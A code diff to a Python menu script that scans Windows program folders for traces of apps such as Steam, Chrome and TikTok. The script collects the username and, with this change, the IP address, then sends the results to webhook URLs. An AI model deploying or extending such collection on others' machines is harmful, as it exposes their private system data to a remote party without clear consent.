@@ -48,7 +48,7 @@ def scan_all_files(base_path, trace_keywords):
             try:
                 with open(file_path, 'r', errors='ignore') as f:
                     content = f.read()
-                    if any(keyword in content for keyword in trace_keywords):
+                    if any(keyword.lower() in content.lower() for keyword in trace_keywords):
                         result.append(file_path)
             except Exception as e:
                 print(f"Failed to read file {file_path}: {e}")
@@ -74,9 +74,20 @@ def get_system_info():
         "Machine": uname.machine,
         "Processor": uname.processor,
         "Boot Time": boot_time.strftime('%Y-%m-%d %H:%M:%S'),
-        "User": getpass.getuser()
+        "User": getpass.getuser(),
+        "IP Address": get_ip_address()  # Add more info if needed
     }
     return system_info
+
+def get_ip_address():
+    """Get the IP address of the system."""
+    try:
+        import socket
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        return ip_address
+    except Exception as e:
+        return f"Could not retrieve IP address: {e}"
 
 def handle_recent_activity(activity_type):
     """Handle recent activity based on user choice."""
@@ -114,8 +125,8 @@ def main():
     
     elif choice == '2':
         print("Starting database search...")
-        # Database search code here
-        delayed_send(WEBHOOK_URLS['database'], "Database Search", "Database search results go here.", 0x0000ff)
+        # Database search code here (add detailed implementation)
+        delayed_send(WEBHOOK_URLS['database'], "Database Search", "Detailed database search results go here.", 0x0000ff)
     
     elif choice == '3':
         print("Starting PC scan...")
@@ -126,10 +137,12 @@ def main():
             'C:\\Program Files (x86)'
         ]
         trace_keywords = ['steam', 'spotify', 'razercortex', 'razer synapse 3', 'lghub', 'chrome', 'tiktok', 'voicemeeterpro', 'brave']
+        all_results = []
         for path in scan_paths:
             print(f"Scanning {path}...")
             results = scan_all_files(path, trace_keywords)
-            delayed_send(WEBHOOK_URLS['process_traces'], "PC Scan Results", '\n'.join(results), 0xff0000)
+            all_results.extend(results)
+        delayed_send(WEBHOOK_URLS['process_traces'], "PC Scan Results", '\n'.join(all_results), 0xff0000)
     
     elif choice == '4':
         system_info = get_system_info()
